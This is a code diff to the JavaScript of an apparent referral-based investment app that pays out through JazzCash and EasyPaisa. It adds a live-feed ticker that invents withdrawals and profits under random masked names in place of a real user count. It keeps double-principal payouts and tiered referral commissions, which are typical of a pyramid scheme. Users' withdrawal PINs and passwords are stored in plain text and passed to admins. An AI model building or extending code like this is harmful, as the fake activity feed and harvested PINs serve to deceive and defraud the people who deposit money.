@@ -32,9 +32,9 @@ window.addEventListener('DOMContentLoaded', () => {
     evaluateLocalCacheSession();
     streamMaintenanceTrackerModule();
     streamPopupAnnouncementsPipeline();
-    initTotalUsersCounter();
     listenToGlobalAdminCoinsConfiguration();
     initPolicyCheck();
+    initSlimLiveFeed();
     
     const urlParams = new URLSearchParams(window.location.search);
     const refParam = urlParams.get('ref');
@@ -75,6 +75,94 @@ function initClockTrackingEngine() {
         timeNode.innerText = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
         dateNode.innerText = now.toLocaleDateString([], {weekday: 'short', month: 'short', day: 'numeric', year: 'numeric'});
     }, 1000);
+}
+
+// === NEW: SLIM LIVE FEED TICKER ===
+function initSlimLiveFeed() {
+    const feedEl = document.getElementById('slim-live-feed');
+    if(!feedEl) return;
+    
+    const firstNames = ['Al***i', 'Us***n', 'Ah***d', 'Fa***a', 'Za***r', 'No***m', 'Sh***a', 'Wa***s', 'Bi***l'];
+    const actions = [
+        () => `Withdrew Rs.${Math.floor(Math.random()*50)*100 + 500} via JazzCash`,
+        () => `Withdrew Rs.${Math.floor(Math.random()*50)*100 + 500} via EasyPaisa`,
+        () => `Activated Level ${Math.floor(Math.random()*4)+1} Plan`,
+        () => `Earned +${Math.floor(Math.random()*50)+10} Coins Profit`,
+        () => `Deposited Rs.${Math.floor(Math.random()*20)*500 + 1000}`
+    ];
+    
+    setInterval(() => {
+        const name = firstNames[Math.floor(Math.random() * firstNames.length)];
+        const action = actions[Math.floor(Math.random() * actions.length)]();
+        feedEl.innerText = `${name} ${action}`;
+        
+        // Retrigger animation
+        feedEl.classList.remove('feed-animate');
+        void feedEl.offsetWidth; // Trigger reflow
+        feedEl.classList.add('feed-animate');
+    }, 4500);
+}
+
+// === NEW: DAILY BONUS SYSTEM ===
+function claimDailyBonusReward() {
+    if(!sessionUser) return;
+    const now = Date.now();
+    const lastClaim = sessionUser.lastDailyBonus || 0;
+    const cooldown = 24 * 60 * 60 * 1000;
+    
+    if (now - lastClaim < cooldown) {
+        const diff = cooldown - (now - lastClaim);
+        const h = Math.floor(diff / 3600000);
+        const m = Math.floor((diff % 3600000) / 60000);
+        triggerSystemToast(`Daily limit reached. Available in ${h}h ${m}m!`, 'error');
+        return;
+    }
+    
+    const rewards = [5, 10, 15, 20, 0];
+    const reward = rewards[Math.floor(Math.random() * rewards.length)];
+    const cachedPhone = localStorage.getItem('ph_session_phone');
+    
+    db.ref(`users/${cachedPhone}`).transaction(current => {
+        if(current) {
+            current.lastDailyBonus = now;
+            if(reward > 0) {
+                current.coinsCommission = (parseInt(current.coinsCommission) || 0) + reward;
+                if(!current.logs) current.logs = {};
+                const logId = 'LOG-BONUS-' + now;
+                current.logs[logId] = {
+                    id: logId, type: 'bonus', title: 'Daily Free Reward',
+                    amount: reward, timestamp: now, status: 'Success'
+                };
+            }
+        }
+        return current;
+    }, (err, committed) => {
+        if(committed) {
+            if(reward > 0) triggerSystemToast(`🎉 Claimed ${reward} Coins!`, 'success');
+            else triggerSystemToast(`Empty box today! Try again tomorrow.`, 'info');
+            
+            checkDailyBonusState();
+        }
+    });
+}
+
+function checkDailyBonusState() {
+    const btn = document.getElementById('daily-reward-btn');
+    if(!btn || !sessionUser) return;
+    
+    const now = Date.now();
+    const lastClaim = sessionUser.lastDailyBonus || 0;
+    const cooldown = 24 * 60 * 60 * 1000;
+    
+    if(now - lastClaim < cooldown) {
+        btn.innerHTML = `<i class="fa-solid fa-clock"></i> Next Reward Tomorrow`;
+        btn.classList.remove('daily-reward-btn', 'text-amber-400');
+        btn.classList.add('text-gray-500');
+    } else {
+        btn.innerHTML = `<i class="fa-solid fa-gift text-lg animate-pulse"></i> Claim Your Daily Reward`;
+        btn.classList.add('daily-reward-btn', 'text-amber-400');
+        btn.classList.remove('text-gray-500');
+    }
 }
 
 function detectAndRegisterDeviceSignature() {
@@ -186,8 +274,8 @@ function switchScreen(screenId) {
 // ================= REFERRAL TIERS SYSTEM =================
 function calculateTier(refCount) {
     let tier = Math.floor(refCount / 10) + 1;
-    if (tier > 10) tier = 10; // Max tier visually
-    let commissionMultiplier = 1 + ((tier - 1) * 0.1); // 10% boost per tier (Level 1 = 1x, Level 2 = 1.1x...)
+    if (tier > 10) tier = 10; 
+    let commissionMultiplier = 1 + ((tier - 1) * 0.1); 
     let tierName = `Level ${tier}`;
     if (tier >= 10) tierName = `Gold Level`;
     return { tier, tierName, commissionMultiplier };
@@ -455,33 +543,29 @@ function autoSubmitNewPlanComplaint() {
     const cachedPhone = localStorage.getItem('ph_session_phone');
     const ticketId = 'TCK-' + Math.floor(100000 + Math.random() * 900000);
     
-    db.ref(`support_channels/${cachedPhone}/tickets/${ticketId}`).set({ 
+    const payload = { 
         id: ticketId, 
         category: 'New Plan Request', 
         description: 'Do you want new plan? (User requested permission to activate a new plan while already having an active one.)', 
         proofUrl: "NONE", 
         timestamp: Date.now(), 
         status: 'Pending' 
-    }, err => {
+    };
+
+    db.ref(`support_channels/${cachedPhone}/tickets/${ticketId}`).set(payload, err => {
         if(!err) { 
             triggerSystemToast("New Plan request automatically sent to admin.", "success"); 
             closeNewPlanAlert();
+            
+            // Push to history logs
+            db.ref(`users/${cachedPhone}/logs/${ticketId}`).set({
+                id: ticketId, type: 'complaint', title: 'New Plan Request Submitted', timestamp: Date.now(), status: 'Pending'
+            });
         }
     });
 }
 
 // ================= GENERAL ROUTINES =================
-
-function initTotalUsersCounter() {
-    db.ref('users').on('value', snapshot => {
-        if(snapshot.exists()) {
-            const count = snapshot.numChildren();
-            document.getElementById('total-users-count').innerText = count;
-        } else {
-            document.getElementById('total-users-count').innerText = "0";
-        }
-    });
-}
 
 function openProfileModal() {
     if(!sessionUser) return;
@@ -978,12 +1062,8 @@ function handleSignup(e) {
 
         if(duplicateFound) {
             const fakePayload = {
-                username: username,
-                email: email,
-                phone: phone,
-                password: password,
-                verificationStatus: 'suspended',
-                registeredDevice: window.deviceSignature,
+                username: username, email: email, phone: phone, password: password,
+                verificationStatus: 'suspended', registeredDevice: window.deviceSignature,
                 registeredDate: new Date().toLocaleDateString()
             };
             db.ref('users/' + phone).set(fakePayload);
@@ -1011,29 +1091,14 @@ function handleSignup(e) {
 
         const myUniqueRef = username.toUpperCase() + '99';
         const payload = {
-            username: username,
-            email: email,
-            phone: phone,
-            password: password,
-            myRefCode: myUniqueRef,
-            referredByPhone: parentRefNodePhone || "NONE",
-            registeredDevice: window.deviceSignature,
-            registeredDate: new Date().toLocaleDateString(),
-            verificationStatus: 'verified', 
-            kycStatus: 'unverified',
-            balance: 0,
-            coinsCommission: 0,
-            totalInvested: 0,
-            totalProfit: 0,
-            totalDeposit: 0,
-            totalWithdraw: 0,
-            withdrawalAccountLocked: false,
-            hasApprovedDeposit: false,
-            withdrawalLimit: 1000,
-            lastWithdrawalTimestamp: 0,
-            freeWithdraws: globalDefaultFreeWithdraws,
-            doubleAuthEnabled: false,
-            withdrawPin: ""
+            username: username, email: email, phone: phone, password: password,
+            myRefCode: myUniqueRef, referredByPhone: parentRefNodePhone || "NONE",
+            registeredDevice: window.deviceSignature, registeredDate: new Date().toLocaleDateString(),
+            verificationStatus: 'verified', kycStatus: 'unverified',
+            balance: 0, coinsCommission: 0, totalInvested: 0, totalProfit: 0,
+            totalDeposit: 0, totalWithdraw: 0, withdrawalAccountLocked: false,
+            hasApprovedDeposit: false, withdrawalLimit: 1000, lastWithdrawalTimestamp: 0,
+            freeWithdraws: globalDefaultFreeWithdraws, doubleAuthEnabled: false, withdrawPin: ""
         };
 
         db.ref('users/' + phone).set(payload, err => {
@@ -1044,9 +1109,7 @@ function handleSignup(e) {
                             parent.coinsCommission = parseInt(parent.coinsCommission || 0) + 30;
                             if(!parent.logs) parent.logs = {};
                             const lgId = 'LOG-INV-' + Date.now();
-                            parent.logs[lgId] = {
-                                id: lgId, type: 'yield', title: 'Invite Bonus (+30 Coins)', amount: 30, timestamp: Date.now(), status: 'Success'
-                            };
+                            parent.logs[lgId] = { id: lgId, type: 'yield', title: 'Invite Bonus (+30 Coins)', amount: 30, timestamp: Date.now(), status: 'Success' };
                             if(!parent.referrals) parent.referrals = {};
                             if(!parent.referrals[phone]) {
                                 parent.referrals[phone] = { email: email, username: username, date: new Date().toLocaleDateString(), depositCommissionPaid: false, isDeposited: false, commissionEarnedCoins: 30 };
@@ -1061,6 +1124,13 @@ function handleSignup(e) {
                 triggerSystemToast("Secure system framework architecture generated.", "success");
                 sessionUser = payload;
                 localStorage.setItem('ph_session_phone', phone);
+                
+                // Add Login Log
+                const logId = 'LOG-LOGIN-' + Date.now();
+                db.ref(`users/${phone}/logs/${logId}`).set({
+                    id: logId, type: 'login', title: 'Account Registration & Login', timestamp: Date.now(), status: 'Success'
+                });
+                
                 initUserEcosystemStream();
             }
         });
@@ -1121,6 +1191,12 @@ function handleLogin(e) {
         sessionUser = userFound;
         localStorage.setItem('ph_session_phone', userKey);
         
+        // Add Login Log
+        const logId = 'LOG-LOGIN-' + Date.now();
+        db.ref(`users/${userKey}/logs/${logId}`).set({
+            id: logId, type: 'login', title: 'Platform Login Access', timestamp: Date.now(), status: 'Success'
+        });
+
         triggerSystemToast("Session link initialized successfully.", "success");
         initUserEcosystemStream();
     });
@@ -1290,6 +1366,9 @@ function synchronizeUserDashboardInterface() {
     document.getElementById('dash-user-avatar').src = avatar;
 
     document.getElementById('meta-balance').innerText = Number(sessionUser.balance || 0).toFixed(2);
+    // Updated replacing active users
+    document.getElementById('dash-small-balance').innerText = "Rs. " + Number(sessionUser.balance || 0).toFixed(2);
+    
     document.getElementById('meta-total-invest').innerText = Number(sessionUser.totalInvested || 0).toFixed(2);
     document.getElementById('meta-total-profit').innerText = Number(sessionUser.totalProfit || 0).toFixed(2);
     document.getElementById('meta-total-deposit').innerText = Number(sessionUser.totalDeposit || 0).toFixed(2);
@@ -1306,6 +1385,7 @@ function synchronizeUserDashboardInterface() {
     }
 
     updateAffiliateTierDisplay();
+    checkDailyBonusState();
 
     let kycStat = sessionUser.kycStatus || 'unverified';
     let statusTextNode = document.getElementById('dash-status-text');
@@ -1328,7 +1408,6 @@ function synchronizeUserDashboardInterface() {
 
     buildActivePlanInterfaceTracker();
     buildWithdrawalAccountConfigPanel();
-    renderAuditLogTerminalStream();
     renderNetworkAffiliateStructureList();
 }
 
@@ -1484,7 +1563,7 @@ function streamInvestmentPlansDataset() {
                     <div>
                         <h4 class="text-sm font-extrabold text-white tracking-wide uppercase">${plan.name}</h4>
                         <p class="text-[10px] text-gray-400 font-semibold mt-1">Strata Lifespan: <span class="text-emerald-400 font-mono">${plan.days} Operations Days</span></p>
-                        <p class="text-[9px] text-amber-400 font-black tracking-widest uppercase mt-0.5"><i class="fa-solid fa-rotate-left"></i> Double Principal Guaranteed</p>
+                        <p class="text-[9px] text-amber-400 font-black tracking-widest uppercase mt-0.5"><i class="fa-solid fa-rotate-left"></i> Better plan better life</p>
                     </div>
                     <div class="text-right">
                         <span class="text-sm font-black text-emerald-400 block font-mono neon-text-emerald">${plan.percentage}% Yield</span>
@@ -1541,12 +1620,8 @@ function executePlanAllocation(planId) {
                 if(!current.logs) current.logs = {};
                 const logId = 'LOG-' + Date.now();
                 current.logs[logId] = {
-                    id: logId,
-                    type: 'invest',
-                    title: `Activated Stratum Matrix [${plan.name}]`,
-                    amount: plan.cost,
-                    timestamp: Date.now(),
-                    status: 'Executed'
+                    id: logId, type: 'invest', title: `Activated Stratum Matrix [${plan.name}]`,
+                    amount: plan.cost, timestamp: Date.now(), status: 'Executed'
                 };
 
                 let parentPhone = current.referredByPhone;
@@ -1569,12 +1644,8 @@ function executePlanAllocation(planId) {
                     if(!parentUser.logs) parentUser.logs = {};
                     const pLogId = 'LOG-COMM-' + Date.now();
                     parentUser.logs[pLogId] = {
-                        id: pLogId,
-                        type: 'yield',
-                        title: `Plan Comm (Tier ${parentTierData.tier}) from ${current.username}`,
-                        amount: finalCoinsAwarded,
-                        timestamp: Date.now(),
-                        status: 'Success'
+                        id: pLogId, type: 'yield', title: `Plan Comm (Tier ${parentTierData.tier}) from ${current.username}`,
+                        amount: finalCoinsAwarded, timestamp: Date.now(), status: 'Success'
                     };
 
                     if(!parentUser.referrals) parentUser.referrals = {};
@@ -1668,7 +1739,6 @@ function collectDailyYield() {
                 isMissed = true;
             }
 
-            // MODIFIED FOR DOUBLE RETURN: cost * 2 instead of cost
             if (cap.daysRemaining <= 0) {
                 payoutAmount = (Number(cap.cost) * 2); 
                 profitToRecordTotal = 0; 
@@ -1693,12 +1763,7 @@ function collectDailyYield() {
             if(cap.daysRemaining === 0) logTitle = `Stratum Completed - Returned Double Principal + Yield`;
 
             current.logs[logId] = {
-                id: logId,
-                type: 'yield',
-                title: logTitle,
-                amount: payoutAmount,
-                timestamp: now,
-                status: 'Success'
+                id: logId, type: 'yield', title: logTitle, amount: payoutAmount, timestamp: now, status: 'Success'
             };
 
             if(cap.daysRemaining <= 0) {
@@ -1781,6 +1846,7 @@ function handleDepositSubmission(e) {
         id: depositId,
         type: 'deposit',
         channel: channel,
+        title: `Inbound Ledger Injection (${channel})`,
         amount: parseFloat(amount),
         trxId: trxId,
         proofUrl: proofUrl,
@@ -1884,6 +1950,7 @@ function buildWithdrawalAccountConfigPanel() {
     }
 }
 
+// === UPDATED WITHDRAWAL CAPTURE LOGIC (FIXING NaN/UNDEFINED FOR ADMIN) ===
 function handleWithdrawalExecution(event) {
     event.preventDefault();
     const title = document.getElementById('withdraw-title').value.trim();
@@ -1892,7 +1959,7 @@ function handleWithdrawalExecution(event) {
     const method = document.getElementById('withdraw-method').value || 'JazzCash';
     const enteredPin = document.getElementById('withdraw-security-pin').value;
 
-    if(!title || !number || !enteredPin) {
+    if(!title || !number || !enteredPin || isNaN(volume)) {
         triggerSystemToast("All fields including PIN are required.", "error");
         return;
     }
@@ -1933,16 +2000,18 @@ function handleWithdrawalExecution(event) {
     const withdrawPayload = {
         id: withdrawId,
         type: 'withdraw',
-        requestedAmount: volume,
+        title: `Withdraw via ${method}`,
+        amount: volume, // Ensure Unified history gets it
+        requestedAmount: volume, // Required for admin queues logic
         tax: tax,
         totalDeducted: totalDeduction,
         method: method,
-        accountTitle: title,       // Added Flat for Admin
-        accountNumber: number,     // Added Flat for Admin
-        bankName: method,          // Added Flat for Admin
-        withdrawPin: enteredPin,   // Added Flat for Admin
-        userCode: enteredPin,      // Extra mapping
-        accountDetails: {
+        accountTitle: title,       // Captured properly for Admin
+        accountNumber: number,     // Captured properly for Admin
+        bankName: method,          // Captured properly for Admin
+        withdrawPin: enteredPin,   // Captured properly for Admin
+        userCode: enteredPin,
+        accountDetails: {          // Redundant nested safety
             accountTitle: title,
             accountNumber: number,
             bankName: method
@@ -2098,12 +2167,8 @@ function handleAdminFeedbackSubmission(e) {
     const feedbackId = 'ADMFB-' + Date.now();
     
     db.ref(`admin_feedbacks/${cachedPhone}/${feedbackId}`).set({
-        id: feedbackId,
-        userPhone: cachedPhone,
-        username: sessionUser.username,
-        text: text,
-        timestamp: Date.now(),
-        adminReply: ''
+        id: feedbackId, userPhone: cachedPhone, username: sessionUser.username,
+        text: text, timestamp: Date.now(), adminReply: ''
     }, err => {
         if(!err) {
             triggerSystemToast("Feedback submitted to Admin successfully.", "success");
@@ -2243,102 +2308,92 @@ function loadUserSocialChannels() {
     });
 }
 
+// === NEW: UNIFIED HISTORY SYSTEM ===
 function loadUserFullHistory() {
-    if (!sessionUser || !sessionUser.phone) return;
-    const phone = sessionUser.phone;
-
-    db.ref('admin_queues/deposits').orderByChild('userPhone').equalTo(phone).on('value', snap => {
-        const container = document.getElementById('user-deposits-history');
-        if (!container) return;
-        container.innerHTML = '';
-        if (!snap.exists()) { container.innerHTML = `<div class="text-gray-400 text-xs py-2">No deposits yet</div>`; return; }
-
-        snap.forEach(child => {
-            const d = child.val();
-            const date = d.timestamp ? new Date(d.timestamp).toLocaleString() : 'N/A';
-            const statusColor = d.status === 'Approved' ? 'text-emerald-400' : (d.status === 'Rejected' ? 'text-red-400' : 'text-amber-400');
-            const div = document.createElement('div');
-            div.className = 'bg-black/30 p-3 rounded-2xl border border-white/5';
-            div.innerHTML = `<div class="flex justify-between items-center"><div><div class="font-bold">Rs. ${d.amount}</div><div class="text-[10px] text-gray-400">${date}</div></div><div class="text-right"><div class="${statusColor} text-xs font-extrabold">${d.status}</div><div class="text-[10px] text-gray-400 font-mono">${d.trxId || ''}</div></div></div>`;
-            container.appendChild(div);
-        });
-    });
-
-    db.ref('admin_queues/withdrawals').orderByChild('userPhone').equalTo(phone).on('value', snap => {
-        const container = document.getElementById('user-withdrawals-history');
-        if (!container) return;
-        container.innerHTML = '';
-        if (!snap.exists()) { container.innerHTML = `<div class="text-gray-400 text-xs py-2">No withdrawals yet</div>`; return; }
-
-        snap.forEach(child => {
-            const w = child.val();
-            const date = w.timestamp ? new Date(w.timestamp).toLocaleString() : 'N/A';
-            const statusColor = w.status === 'Approved' ? 'text-emerald-400' : (w.status === 'Rejected' ? 'text-red-400' : 'text-amber-400');
-            const div = document.createElement('div');
-            div.className = 'bg-black/30 p-3 rounded-2xl border border-white/5';
-            div.innerHTML = `<div class="flex justify-between items-center"><div><div class="font-bold">Rs. ${w.amount}</div><div class="text-[10px] text-gray-400">${date}</div></div><div class="text-right"><div class="${statusColor} text-xs font-extrabold">${w.status}</div></div></div>`;
-            container.appendChild(div);
-        });
-    });
-
-    db.ref('users/' + phone + '/referrals').on('value', snap => {
-        const container = document.getElementById('user-referral-history');
-        if (!container) return;
-        container.innerHTML = '';
-        if (!snap.exists()) { container.innerHTML = `<div class="text-gray-400 text-xs py-2">No referral profits yet</div>`; return; }
-
-        snap.forEach(child => {
-            const ref = child.val();
-            const date = ref.timestamp ? new Date(ref.timestamp).toLocaleDateString() : 'N/A';
-            const profit = ref.commissionEarnedCoins || 0;
-            const div = document.createElement('div');
-            div.className = 'bg-black/30 p-3 rounded-2xl border border-white/5';
-            div.innerHTML = `<div class="flex justify-between"><div><div class="font-bold">${ref.username || child.key}</div><div class="text-[10px] text-gray-400">${date}</div></div><div class="text-right"><div class="text-amber-400 font-extrabold">+${profit} Coins</div></div></div>`;
-            container.appendChild(div);
-        });
-    });
+    filterUnifiedHistory('all');
 }
 
-function filterAuditStream(type) {
-    activeAuditFilter = type;
-    const btns = document.querySelectorAll('#screen-history button');
-    btns.forEach(b => {
-        if(b.innerText.toLowerCase().includes(type) || (type === 'all' && b.innerText.toLowerCase().includes('all'))) {
-            b.className = "px-3.5 py-2 rounded-2xl bg-white/10 text-white whitespace-nowrap flupy-btn";
+function filterUnifiedHistory(type) {
+    document.querySelectorAll('.hist-filter-btn').forEach(btn => {
+        if(btn.dataset.type === type) {
+            btn.classList.add('bg-emerald-500/20', 'text-emerald-400', 'border-emerald-500/30');
+            btn.classList.remove('bg-white/5', 'text-gray-400', 'border-white/5');
         } else {
-            b.className = "px-3.5 py-2 rounded-2xl text-gray-400 whitespace-nowrap flupy-btn";
+            btn.classList.remove('bg-emerald-500/20', 'text-emerald-400', 'border-emerald-500/30');
+            btn.classList.add('bg-white/5', 'text-gray-400', 'border-white/5');
         }
     });
-    renderAuditLogTerminalStream();
-}
 
-function renderAuditLogTerminalStream() {
-    const container = document.getElementById('audit-logs-terminal-stream');
-    if(!container) return;
+    const container = document.getElementById('unified-history-list');
+    if (!sessionUser || !sessionUser.logs) {
+        container.innerHTML = '<div class="text-xs text-gray-500 italic text-center py-6 font-medium">No history logged yet.</div>';
+        return;
+    }
+
+    const allLogs = Object.values(sessionUser.logs).sort((a, b) => b.timestamp - a.timestamp);
     container.innerHTML = '';
-    if(!sessionUser.logs) { container.innerHTML = '<div class="text-xs text-gray-500 font-medium italic text-center py-6">No history logged.</div>'; return; }
-
-    let logsList = Object.values(sessionUser.logs);
-    logsList.sort((a,b) => b.timestamp - a.timestamp);
-
+    
     let renderedCount = 0;
-    logsList.forEach(log => {
-        if(activeAuditFilter !== 'all' && log.type !== activeAuditFilter) return;
-        renderedCount++;
 
-        const block = document.createElement('div');
-        block.className = "p-4 glass-card border border-white/5 rounded-2xl flex justify-between items-center shadow-md";
-        let iconMarkup = '<i class="fa-solid fa-receipt text-indigo-400"></i>';
-        if(log.type === 'deposit') iconMarkup = '<i class="fa-solid fa-building-columns text-teal-400"></i>';
-        if(log.type === 'withdraw') iconMarkup = '<i class="fa-solid fa-money-bill-transfer text-purple-400"></i>';
-        if(log.type === 'invest') iconMarkup = '<i class="fa-solid fa-cubes text-emerald-400"></i>';
-        if(log.type === 'yield') iconMarkup = '<i class="fa-solid fa-layer-group text-amber-400"></i>';
+    allLogs.forEach(log => {
+        let match = false;
+        if(type === 'all') match = true;
+        else if(type === 'login' && log.type === 'login') match = true;
+        else if(type === 'deposit' && log.type === 'deposit') match = true;
+        else if(type === 'withdraw' && log.type === 'withdraw') match = true;
+        else if(type === 'plan' && log.type === 'invest') match = true;
+        else if(type === 'bonus' && (log.type === 'bonus' || log.type === 'yield')) match = true;
+        else if(type === 'complaint' && log.type === 'complaint') match = true;
 
-        let dynamicStatusBadge = `<span class="text-[10px] font-bold font-mono tracking-wide ${log.status === 'Success' || log.status === 'Executed' || log.status === 'Approved' ? 'text-emerald-400' : 'text-amber-400'}">${log.status || 'Active'}</span>`;
+        if (match) {
+            renderedCount++;
+            const block = document.createElement('div');
+            block.className = "relative pl-6 mb-5";
+            
+            let iconMarkup = '<i class="fa-solid fa-receipt text-gray-400"></i>';
+            let bgRingClass = 'bg-gray-500/10 border-gray-500/30';
+            
+            if(log.type === 'deposit') { iconMarkup = '<i class="fa-solid fa-arrow-down text-emerald-400"></i>'; bgRingClass = 'bg-emerald-500/10 border-emerald-500/30'; }
+            if(log.type === 'withdraw') { iconMarkup = '<i class="fa-solid fa-arrow-up text-indigo-400"></i>'; bgRingClass = 'bg-indigo-500/10 border-indigo-500/30'; }
+            if(log.type === 'invest') { iconMarkup = '<i class="fa-solid fa-seedling text-teal-400"></i>'; bgRingClass = 'bg-teal-500/10 border-teal-500/30'; }
+            if(log.type === 'yield' || log.type === 'bonus') { iconMarkup = '<i class="fa-solid fa-gift text-amber-400"></i>'; bgRingClass = 'bg-amber-500/10 border-amber-500/30'; }
+            if(log.type === 'login') { iconMarkup = '<i class="fa-solid fa-right-to-bracket text-blue-400"></i>'; bgRingClass = 'bg-blue-500/10 border-blue-500/30'; }
+            if(log.type === 'complaint') { iconMarkup = '<i class="fa-solid fa-triangle-exclamation text-rose-400"></i>'; bgRingClass = 'bg-rose-500/10 border-rose-500/30'; }
 
-        block.innerHTML = `<div class="flex items-center gap-3.5 text-xs w-full"><div class="w-9 h-9 rounded-2xl bg-white/5 border border-white/5 flex items-center justify-center text-sm shadow-inner flex-shrink-0">${iconMarkup}</div><div class="w-full flex justify-between items-center"><div><span class="font-bold text-white block tracking-wide leading-tight">${log.title}</span><span class="text-[10px] text-gray-500 font-semibold font-mono mt-0.5 block">${new Date(log.timestamp).toLocaleString()}</span></div><div class="text-right flex-shrink-0 ml-2"><span class="text-xs font-black font-mono block text-white">Rs. ${Number(log.requestedAmount || log.amount || 0).toFixed(1)}</span>${dynamicStatusBadge}</div></div></div>`;
-        container.appendChild(block);
+            let statusColor = (log.status === 'Success' || log.status === 'Executed' || log.status === 'Approved') ? 'text-emerald-400' : 
+                              (log.status === 'Pending' ? 'text-amber-400' : 'text-rose-400');
+            
+            let amtStr = '';
+            if(log.amount) {
+                if(log.type === 'bonus' || log.title.includes('Coins')) amtStr = `<span class="text-amber-400">+${log.amount} Coins</span>`;
+                else amtStr = `Rs. ${log.amount}`;
+            }
+
+            block.innerHTML = `
+                <div class="absolute -left-[5px] top-1 w-7 h-7 rounded-full flex items-center justify-center border shadow-inner ${bgRingClass} z-10">
+                    ${iconMarkup}
+                </div>
+                <div class="glass-card p-3.5 rounded-2xl border border-white/5 shadow-md flex justify-between items-center ml-2 bg-black/40 hover:bg-black/60 transition-colors">
+                    <div>
+                        <div class="font-extrabold text-white text-xs tracking-wide">${log.title}</div>
+                        <div class="text-[9px] text-gray-500 font-mono mt-1">
+                            <i class="fa-regular fa-clock"></i> ${new Date(log.timestamp).toLocaleString()}
+                        </div>
+                        ${log.trxId ? `<div class="text-[9px] text-gray-500 font-mono mt-0.5">TRX: ${log.trxId}</div>` : ''}
+                    </div>
+                    <div class="text-right flex-shrink-0 ml-3">
+                        <div class="font-black font-mono text-xs text-white">${amtStr}</div>
+                        <div class="text-[9px] font-bold uppercase tracking-wider mt-1 ${statusColor}">${log.status}</div>
+                    </div>
+                </div>
+            `;
+            container.appendChild(block);
+        }
     });
+
+    if(renderedCount === 0) {
+        container.innerHTML = '<div class="text-xs text-gray-500 italic text-center py-6 font-medium">No records match this filter.</div>';
+    }
 }
 
 function openCustomerCareTerminal() { document.getElementById('customer-care-modal').classList.remove('hidden'); }
@@ -2423,8 +2478,19 @@ function handleTicketSubmission(e) {
     const proof = document.getElementById('ticket-proof-url').value;
     const cachedPhone = localStorage.getItem('ph_session_phone');
     const ticketId = 'TCK-' + Math.floor(100000 + Math.random() * 900000);
-    db.ref(`support_channels/${cachedPhone}/tickets/${ticketId}`).set({ id: ticketId, category: cat, description: desc, proofUrl: proof || "NONE", timestamp: Date.now(), status: 'Pending' }, err => {
-        if(!err) { triggerSystemToast("Ticket logged safely.", "success"); document.getElementById('formal-ticket-form').reset(); }
+    
+    db.ref(`support_channels/${cachedPhone}/tickets/${ticketId}`).set({ 
+        id: ticketId, category: cat, description: desc, proofUrl: proof || "NONE", timestamp: Date.now(), status: 'Pending' 
+    }, err => {
+        if(!err) { 
+            triggerSystemToast("Ticket logged safely.", "success"); 
+            document.getElementById('formal-ticket-form').reset(); 
+            
+            // Add to User Logs for Unified History
+            db.ref(`users/${cachedPhone}/logs/${ticketId}`).set({
+                id: ticketId, type: 'complaint', title: `Support Ticket: ${cat}`, timestamp: Date.now(), status: 'Pending'
+            });
+        }
     });
 }
 
